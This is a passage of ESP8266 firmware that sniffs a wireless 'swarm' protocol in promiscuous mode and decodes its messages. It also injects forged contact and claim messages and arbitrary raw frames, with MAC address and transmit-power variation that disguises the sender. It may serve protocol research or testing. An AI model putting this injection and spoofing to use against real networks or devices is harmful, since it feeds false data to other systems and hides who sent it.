      if (scan_flk[ch] > most) most = scan_flk[ch];
    for (uint8_t ch = 1; ch <= 13; ch++) {
      if (uint32_t(scan_flk[ch]) * 2 < most) continue;
      set_channel(ch);
      scan_at = ch;
      if (oled::present) render(millis());
      delay(30);
      while (tail != head) tail = (tail + 1) % RING_N;
      uint32_t end = millis() + dwell_ms;
      while (millis() < end) {
        while (tail != head) {
          Slot& s = ring[tail];
          decode(s.buf, s.len, s.ms);
          tail = (tail + 1) % RING_N;
        }
        demo_tick(millis());
        delay(10);
      }
    }
    best = scan_best(&margin);
  }
  scan_margin = margin;
  set_channel(lock && best ? best : original);
  scan_at = 0;
  scanning = false;
  if (oled::present) render(millis());
  Serial.printf("{\"cmd\":\"scan\",\"done\":true,\"channel\":%u,\"swarm_channel\":%u,"
                "\"swarm_rssi\":%d,\"margin_db\":%d.%d,\"extra_rounds\":%d,\"confident\":%s,"
                "\"locked\":%s}\n",
                channel, best, best ? scan_rssi(best) : 0, margin / 10, margin % 10, rounds,
                best && margin >= 10 ? "true" : "false", lock && best ? "true" : "false");
}

static void cmd_stats(uint32_t now) {
  char mac[18];
  uint8_t own[6];
  wifi_get_macaddr(STATION_IF, own);
  fmt_mac(mac, own);
  Serial.printf("{\"cmd\":\"stats\",\"fw\":\"%s\",\"role\":\"combined\",\"mode\":\"%s\","
                "\"mac\":\"%s\",\"channel\":%u,\"uptime_ms\":%lu,\"verbose\":%s,\"demo\":%s,"
                "\"drops\":%lu,\"ring_peak\":%u,\"flk2\":%lu,\"flk2_truncated\":%lu,"
                "\"telem\":%lu,\"contact\":%lu,\"claim\":%lu,\"flk1_req\":%lu,\"flk1_rep\":%lu,"
                "\"inj_sent\":%lu,\"inj_active\":%d,\"tx_failed\":%lu,\"tx_refused\":%lu,"
                "\"beacons\":%lu,\"mgmt_other\":%lu}\n",
                FW_VERSION, mode == INJECT ? "inject" : "sniff", mac, channel,
                (unsigned long)(now - boot_ms), verbose ? "true" : "false",
                demo_on ? "true" : "false", (unsigned long)drops, ring_peak,
                (unsigned long)flk2_total(), (unsigned long)flk2_truncated,
                (unsigned long)flk3_telem, (unsigned long)flk4_contact, (unsigned long)flk5_claim,
                (unsigned long)flk1_req, (unsigned long)flk1_rep, (unsigned long)inj_sent,
                active_injections(), (unsigned long)failed, (unsigned long)refused,
                (unsigned long)beacons, (unsigned long)mgmt_other);
  ring_peak = 0;
}

// ---- serial commands -------------------------------------------------------
static void handle_line(char* line, uint32_t now) {
  // --- shared ---
  if (!strncmp(line, "CH ", 3)) {
    int ch = atoi(line + 3);
    if (ch >= 1 && ch <= 13) { set_channel(uint8_t(ch)); Serial.printf("{\"cmd\":\"ch\",\"channel\":%d}\n", ch); }
    else Serial.println("{\"error\":\"channel must be 1..13\"}");
    return;
  }
  if (!strcmp(line, "STATS")) { cmd_stats(now); return; }
  if (!strcmp(line, "QUIET")) { verbose = false; Serial.println("{\"cmd\":\"quiet\"}"); return; }
  if (!strcmp(line, "VERBOSE")) { verbose = true; Serial.println("{\"cmd\":\"verbose\"}"); return; }
  if (!strcmp(line, "RESET")) { Serial.println("{\"cmd\":\"reset\"}"); delay(50); ESP.restart(); return; }
  if (!strcmp(line, "SNIFF")) { enter_sniff(); Serial.println("{\"cmd\":\"mode\",\"mode\":\"sniff\"}"); return; }
  if (!strcmp(line, "INJECT")) { enter_inject(); Serial.println("{\"cmd\":\"mode\",\"mode\":\"inject\"}"); return; }
  if (!strcmp(line, "HELP")) {
    Serial.println("{\"cmd\":\"help\",\"mode\":\"combined\",\"commands\":["
                   "\"SNIFF\",\"INJECT\",\"CH <1-13>\",\"STATS\",\"VERBOSE\",\"QUIET\",\"RESET\","
                   "\"SCAN <ms>\",\"FIND <ms>\",\"PAGE <0|1|2|AUTO>\",\"RAW <n>\",\"DEMO <ON|OFF>\","
                   "\"CONTACT <id> <x> <y> <cls> <conf> <flags>\",\"CONTACT <id|''> OFF\","
                   "\"CLAIM <label> <contact> <role> <dist>\",\"CLAIM <label|''> OFF\","
                   "\"SEND <hex>\",\"MAC <VARY|OWN>\",\"POWER <0-20|VARY>\"]}");
    return;
  }

  // --- injection (auto-switch to INJECT) ---
  bool inj = !strncmp(line, "CONTACT", 7) || !strncmp(line, "CLAIM", 5) ||
             !strncmp(line, "SEND ", 5) || !strncmp(line, "MAC ", 4) || !strncmp(line, "POWER", 5);
  if (inj) {
    if (mode != INJECT) { enter_inject(); Serial.println("{\"cmd\":\"mode\",\"mode\":\"inject\",\"auto\":true}"); }
    if (!strcmp(line, "CONTACT OFF")) {
      for (auto& c : inj_contact) c.on = false;
      Serial.println("{\"cmd\":\"contact\",\"all\":false}");
    } else if (!strncmp(line, "CONTACT ", 8)) {
      int id = -1, x = 0, y = 0, cls = 0, conf = 0, flags = 0; char off[8] = "";
      if (sscanf(line + 8, "%d %7s", &id, off) == 2 && !strcmp(off, "OFF") && id >= 0 && id < 8) {
        inj_contact[id].on = false;
        Serial.printf("{\"cmd\":\"contact\",\"id\":%d,\"on\":false}\n", id);
      } else if (sscanf(line + 8, "%d %d %d %d %d %d", &id, &x, &y, &cls, &conf, &flags) == 6 &&
                 id >= 0 && id < 8 && cls >= 0 && cls <= 3 && conf >= 0 && conf <= 255 &&
                 flags >= 0 && flags <= 255 && x >= -32768 && x <= 32767 && y >= -32768 && y <= 32767) {
        InjContact& c = inj_contact[id];
        c = {true, int16_t(x), int16_t(y), uint8_t(cls), uint8_t(conf), uint8_t(flags), c.seq, 0};
        Serial.printf("{\"cmd\":\"contact\",\"id\":%d,\"on\":true,\"x\":%d,\"y\":%d,"
                      "\"cls\":%d,\"conf\":%d,\"flags\":%d,\"every_ms\":%lu}\n",
                      id, x, y, cls, conf, flags, (unsigned long)CONTACT_MS);
      } else Serial.println("{\"error\":\"CONTACT <id 0-7> <x> <y> <cls 0-3> <conf 0-255> <flags> | CONTACT <id> OFF\"}");
    } else if (!strcmp(line, "CLAIM OFF")) {
      for (auto& c : inj_claim) c.on = false;
      Serial.println("{\"cmd\":\"claim\",\"all\":false}");
    } else if (!strncmp(line, "CLAIM ", 6)) {
      char lab[8] = "", off[8] = ""; int contact = 0, role = 0, dist = 0;
      if (sscanf(line + 6, "%7s %7s", lab, off) == 2 && !strcmp(off, "OFF") && label_slot(lab) >= 0) {
        inj_claim[label_slot(lab)].on = false;
        Serial.printf("{\"cmd\":\"claim\",\"label\":\"%s\",\"on\":false}\n", lab);
      } else if (sscanf(line + 6, "%7s %d %d %d", lab, &contact, &role, &dist) == 4 &&
                 label_slot(lab) >= 0 && contact >= 0 && contact < 8 && role >= 0 && role <= 3 &&
                 dist >= 0 && dist <= 65535) {
        InjClaim& c = inj_claim[label_slot(lab)];
        c = {true, {lab[0], lab[1]}, uint8_t(contact), uint8_t(role), uint16_t(dist), c.seq, 0};
        Serial.printf("{\"cmd\":\"claim\",\"label\":\"%s\",\"on\":true,\"contact\":%d,"
                      "\"role\":%d,\"dist\":%d,\"every_ms\":%lu}\n",
                      lab, contact, role, dist, (unsigned long)CLAIM_MS);
      } else Serial.println("{\"error\":\"CLAIM <label A1-D4> <contact 0-7> <role 1-3> <dist> | CLAIM <label> OFF\"}");
    } else if (!strncmp(line, "SEND ", 5)) {
      const char* h = line + 5;
      uint8_t buf[250]; int n = 0;
      while (h[0] && h[1] && n < 250) {
        if (h[0] == ' ') { h++; continue; }
        int hi = hexval(h[0]), lo = hexval(h[1]);
        if (hi < 0 || lo < 0) { n = -1; break; }
        buf[n++] = uint8_t(hi << 4 | lo); h += 2;
      }
      if (n >= 1 && !(h[0] && h[1] == 0)) {
        bool ok = inj_broadcast(buf, uint8_t(n), now);
        Serial.printf("{\"cmd\":\"send\",\"bytes\":%d,\"ok\":%s,\"rc\":%d}\n", n, ok ? "true" : "false", last_rc);
      } else Serial.println("{\"error\":\"SEND <even-length hex, 1..250 bytes>\"}");
    } else if (!strcmp(line, "MAC VARY") || !strcmp(line, "MAC OWN")) {
      vary_mac = line[4] == 'V';
      Serial.printf("{\"cmd\":\"mac\",\"mode\":\"%s\"}\n", vary_mac ? "vary" : "own");
    } else if (!strcmp(line, "POWER VARY")) {
      vary_power = true; Serial.println("{\"cmd\":\"power\",\"mode\":\"vary\"}");
    } else if (!strncmp(line, "POWER ", 6)) {
      int dbm = atoi(line + 6);
      if (dbm >= 0 && dbm <= 20) { vary_power = false; fixed_tpw = uint8_t(dbm * 4);
        Serial.printf("{\"cmd\":\"power\",\"mode\":\"fixed\",\"dbm\":%d}\n", dbm);
      } else Serial.println("{\"error\":\"power must be 0..20 dBm or VARY\"}");
    } else Serial.println("{\"error\":\"unknown inject command\"}");
    return;
  }

  // --- capture (SNIFF only) ---
  if (mode != SNIFF) { Serial.println("{\"error\":\"capture commands need SNIFF mode\"}"); return; }
  if (!strncmp(line, "SCAN", 4) && (!line[4] || line[4] == ' ')) {
    long dwell = line[4] ? atol(line + 5) : 1500;
    cmd_scan(uint32_t(dwell < 500 ? 500 : dwell > 15000 ? 15000 : dwell), false);
  } else if (!strncmp(line, "FIND", 4) && (!line[4] || line[4] == ' ')) {
    long dwell = line[4] ? atol(line + 5) : 1500;
    cmd_scan(uint32_t(dwell < 500 ? 500 : dwell > 15000 ? 15000 : dwell), true);
  } else if (!strncmp(line, "PAGE", 4)) {
    page_mode = line[4] == ' ' && line[5] >= '0' && line[5] <= '2' ? line[5] - '0' : -1;
    Serial.printf("{\"cmd\":\"page\",\"mode\":%d}\n", page_mode);
  } else if (!strncmp(line, "RAW", 3)) {
    raw_pending = atoi(line + 3);
    if (raw_pending < 1) raw_pending = 3;
    if (raw_pending > 20) raw_pending = 20;
    queue_all = true;
    Serial.printf("{\"cmd\":\"raw\",\"pending\":%d}\n", raw_pending);
  } else if (!strcmp(line, "DEMO ON") || !strcmp(line, "DEMO OFF")) {
    set_demo(line[6] == 'N');
    Serial.printf("{\"cmd\":\"demo\",\"on\":%s,\"channel\":%u}\n", demo_on ? "true" : "false", demo::CHANNEL);
  } else if (line[0]) Serial.println("{\"error\":\"unknown command\"}");
}

// ---- setup / loop ----------------------------------------------------------
static char linebuf[256];
static size_t linelen = 0;
static uint32_t last_stat = 0;
static const uint32_t STAT_MS = 10000;

void setup() {
  boot_ms = millis();
  Serial.begin(115200);
  delay(200);
  WiFi.persistent(false);
  WiFi.mode(WIFI_STA);
  wifi_station_disconnect();

  uint8_t own[6];
  wifi_get_macaddr(STATION_IF, own);
  memcpy(own_mac, own, 6); memcpy(current_mac, own, 6);
  char mac[18]; fmt_mac(mac, own);
  Serial.printf("{\"boot\":\"flock-combined\",\"fw\":\"%s\",\"mac\":\"%s\","
                "\"chip_id\":%06X,\"flash_bytes\":%lu,\"default_channel\":%u,\"mode\":\"sniff\"}\n",
                FW_VERSION, mac, (unsigned)ESP.getChipId(),
                (unsigned long)ESP.getFlashChipSize(), DEFAULT_CHANNEL);

  bool found = oled::detect();
  Serial.printf("{\"oled\":{\"found\":%s,\"sda\":%d,\"scl\":%d,\"addr\":%u}}\n",
                found ? "true" : "false", oled::pin_sda, oled::pin_scl, oled::addr);

  wifi_set_promiscuous_rx_cb(sniffer_cb);
  set_channel(DEFAULT_CHANNEL);
  wifi_promiscuous_enable(1);   // boot in SNIFF

  if (found) {
    oled::row(0, "FLOCK COMBINED");
    oled::row(1, "SNIFF  BOOT OK");
    oled::flush();
  }
}

void loop() {
  uint32_t now = millis();
  // Drain the capture ring (empty in INJECT, since promiscuous is off).
  uint8_t queued = uint8_t((head + RING_N - tail) % RING_N);
  if (queued > ring_peak) ring_peak = queued;
  int budget = 16;
  while (tail != head && budget-- > 0) {
    Slot& s = ring[tail];
    decode(s.buf, s.len, s.ms);
    tail = (tail + 1) % RING_N;
  }
  demo_tick(now);
  inject_tick(now);
  if (tx_busy && now - busy_since > 100) tx_busy = false;   // callback safety net
  while (Serial.available()) {
    char c = char(Serial.read());
    if (c == '\n' || c == '\r') {
      if (linelen) { linebuf[linelen] = 0; handle_line(linebuf, millis()); linelen = 0; }
    } else if (linelen + 1 < sizeof(linebuf)) linebuf[linelen++] = c;
  }
  if (verbose && now - last_stat >= STAT_MS) {
    last_stat = now;
    Serial.printf("{\"t\":%lu,\"ch\":%u,\"stat\":{\"mode\":\"%s\",\"drops\":%lu,\"ring_peak\":%u,"
                  "\"seen\":%d,\"flk1\":%lu,\"flk2\":%lu,\"inj_sent\":%lu}}\n",
                  (unsigned long)now, channel, mode == INJECT ? "inject" : "sniff",
                  (unsigned long)drops, ring_peak, nodes_seen(now),
                  (unsigned long)(flk1_req + flk1_rep), (unsigned long)flk2_total(),
                  (unsigned long)inj_sent);
    ring_peak = 0;
  }
  if (oled::present && now - last_flush >= FLUSH_MS) { render(now); last_flush = now; }
  delay(1);
}
